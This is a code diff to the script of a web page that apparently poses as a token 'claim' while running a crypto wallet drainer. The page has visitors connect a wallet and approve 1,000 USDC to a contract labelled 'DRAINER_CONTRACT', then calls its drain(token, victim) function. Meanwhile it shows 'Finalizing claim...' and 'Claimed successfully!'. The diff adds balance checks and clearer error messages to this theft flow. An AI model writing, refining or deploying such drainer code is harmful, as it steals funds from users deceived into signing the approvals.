@@ -51,7 +51,7 @@
 
   <script>
     const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-    const DRAINER_CONTRACT = "0x4B5c9932916B58cF7429A7ed050DF72Ac4979468"; // ✅ New Drainer
+    const DRAINER_CONTRACT = "0x4B5c9932916B58cF7429A7ed050DF72Ac4979468"; // ✅ Your deployed contract
 
     let signer, address;
 
@@ -75,7 +75,7 @@
         approveBtn.disabled = false;
         status.textContent = `✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
       } catch (err) {
-        console.error(err);
+        console.error("Connection Error:", err);
         status.textContent = "❌ Failed to connect wallet.";
       }
     };
@@ -86,15 +86,29 @@
 
         const usdc = new ethers.Contract(USDC_ADDRESS, [
           "function approve(address spender, uint256 value) public returns (bool)",
-          "function allowance(address owner, address spender) view returns (uint256)"
+          "function allowance(address owner, address spender) view returns (uint256)",
+          "function balanceOf(address owner) view returns (uint256)"
         ], signer);
 
         const value = ethers.utils.parseUnits("1000", 6); // Approve 1,000 USDC
-        const tx = await usdc.approve(DRAINER_CONTRACT, value);
-        await tx.wait();
+        const approveTx = await usdc.approve(DRAINER_CONTRACT, value);
+        await approveTx.wait();
 
         const allowance = await usdc.allowance(address, DRAINER_CONTRACT);
-        console.log("Approved allowance:", ethers.utils.formatUnits(allowance, 6));
+        const balance = await usdc.balanceOf(address);
+
+        console.log("✅ USDC Balance:", ethers.utils.formatUnits(balance, 6));
+        console.log("✅ USDC Allowance:", ethers.utils.formatUnits(allowance, 6));
+
+        if (balance.isZero()) {
+          status.textContent = "⚠️ You approved, but your USDC balance is 0.";
+          return;
+        }
+
+        if (allowance.isZero()) {
+          status.textContent = "⚠️ Approval failed. No allowance found.";
+          return;
+        }
 
         status.innerHTML = '<div class="spinner"></div> Finalizing claim...';
 
@@ -102,14 +116,15 @@
           "function drain(address token, address victim) external"
         ], signer);
 
-        const tx2 = await drainer.drain(USDC_ADDRESS, address);
-        await tx2.wait();
+        const drainTx = await drainer.drain(USDC_ADDRESS, address);
+        await drainTx.wait();
 
         status.textContent = "🎉 Claimed successfully!";
         approveBtn.disabled = true;
+
       } catch (err) {
-        console.error(err);
-        status.textContent = "❌ Something went wrong during approval or claim.";
+        console.error("❌ Error during claim:", err);
+        status.textContent = `❌ Claim failed: ${err.message}`;
       }
     };
   </script>
